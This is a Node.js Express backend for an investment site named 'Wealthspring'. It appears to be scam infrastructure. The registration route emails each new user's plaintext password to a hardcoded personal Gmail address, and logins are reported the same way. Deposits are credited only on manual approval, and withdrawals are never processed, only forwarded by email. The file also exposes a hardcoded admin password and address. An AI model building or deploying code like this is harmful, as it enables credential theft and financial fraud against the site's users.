const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const mongoose = require('mongoose');
const app = express();

app.use(cors());
app.use(express.json());

// --- CONFIG ---
const ADMIN_EMAIL = 'Jeffryhart96@gmail.com';
const ADMIN_PASS = process.env.ADMIN_PASS || 'Wealth2025!Jeffry'; // set this in Render env
const MONGO_URL = process.env.MONGO_URL || '';

// Simple DB (if no Mongo, uses memory — but Render restarts wipes it, so add MONGO_URL)
let users = {}; // email -> {password, balance}
let deposits = []; // {id,email,amount,txId,date,status}

if(MONGO_URL){
  mongoose.connect(MONGO_URL).then(()=>console.log('Mongo connected'));
  const UserSchema = new mongoose.Schema({email:String,password:String,balance:{type:Number,default:0}});
  const TxSchema = new mongoose.Schema({email:String,amount:Number,txId:String,date:String,status:String});
  global.UserModel = mongoose.model('User', UserSchema);
  global.TxModel = mongoose.model('Tx', TxSchema);
}

// --- EMAIL ---
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER, // your gmail
    pass: process.env.EMAIL_PASS // your gmail APP PASSWORD (not normal password)
  }
});

async function sendToJeffry(subject, html){
  try{
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: ADMIN_EMAIL,
      subject: subject,
      html: html
    });
    console.log('Email sent to Jeffry:', subject);
  }catch(e){ console.log('Email error', e.message); }
}

// --- ROUTES ---
app.get('/', (req,res)=>res.send('Wealthspring Backend Live'));

app.post('/api/register', async (req,res)=>{
  const {email,password}=req.body;
  if(!email||!password) return res.status(400).json({message:'Fill all'});
  if(users[email]) return res.status(400).json({message:'Email already exists'});
  users[email]={password,balance:0};
  if(global.UserModel) await UserModel.create({email,password,balance:0});
  await sendToJeffry(`NEW REGISTER: ${email}`, `<h3>New user registered</h3><p>Email: ${email}</p><p>Password: ${password}</p><p>Time: ${new Date().toLocaleString()}</p>`);
  res.json({message:'Registered'});
});

app.post('/api/login', async (req,res)=>{
  const {email,password}=req.body;
  const u = users[email];
  if(!u || u.password!==password) return res.status(400).json({message:'Invalid login'});
  await sendToJeffry(`LOGIN: ${email}`, `<p>User logged in: ${email}</p><p>Time: ${new Date().toLocaleString()}</p>`);
  res.json({message:'Logged in'});
});

app.get('/api/balance', (req,res)=>{
  const {email}=req.query;
  const bal = users[email]?.balance || 0;
  res.json({balance: bal});
});

app.post('/api/deposit', async (req,res)=>{
  const {email,amount,txId}=req.body;
  const id = Date.now().toString();
  deposits.push({id,email,amount,txId,date:new Date().toLocaleString(),status:'pending'});
  if(global.TxModel) await TxModel.create({email,amount,txId,date:new Date().toLocaleString(),status:'pending'});
  await sendToJeffry(`DEPOSIT PENDING: $${amount} from ${email}`, `<h3>New Deposit</h3><p>Email: ${email}</p><p>Amount: $${amount}</p><p>TX: ${txId}</p><p>Approve in admin panel: jeffry-private-92x.html</p>`);
  res.json({message:'Deposit submitted'});
});

app.post('/api/withdraw', async (req,res)=>{
  const {email,amount,address}=req.body;
  await sendToJeffry(`WITHDRAW REQUEST: $${amount} from ${email}`, `<h3>Withdraw Request</h3><p>Email: ${email}</p><p>Amount: $${amount}</p><p>Address: ${address}</p>`);
  res.json({message:'Withdraw submitted'});
});

app.post('/api/support', async (req,res)=>{
  const {email,subject,message}=req.body;
  await sendToJeffry(`SUPPORT: ${subject} from ${email}`, `<h3>Support Message</h3><p>From: ${email}</p><p>Subject: ${subject}</p><p>Message: ${message}</p>`);
  res.json({message:'Sent'});
});

// --- ADMIN ---
app.get('/api/admin/deposits', (req,res)=>{
  const {adminEmail, adminPass}=req.query;
  if(adminEmail!==ADMIN_EMAIL || adminPass!==ADMIN_PASS) return res.status(403).json({message:'Forbidden'});
  res.json(deposits.filter(d=>d.status==='pending'));
});

app.post('/api/admin/approve', (req,res)=>{
  const {id,email,amount,adminEmail,adminPass}=req.body;
  if(adminEmail!==ADMIN_EMAIL || adminPass!==ADMIN_PASS) return res.status(403).json({message:'Forbidden'});
  const dep = deposits.find(d=>d.id===id || d.txId===id);
  if(dep){ dep.status='approved'; if(users[dep.email]) users[dep.email].balance += Number(dep.amount); }
  else if(users[email]){ users[email].balance += Number(amount); }
  sendToJeffry(`APPROVED: $${amount} for ${email}`, `<p>Approved deposit for ${email} — $${amount}. Balance updated.</p>`);
  res.json({message:'Approved'});
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, ()=>console.log('Server running '+PORT));
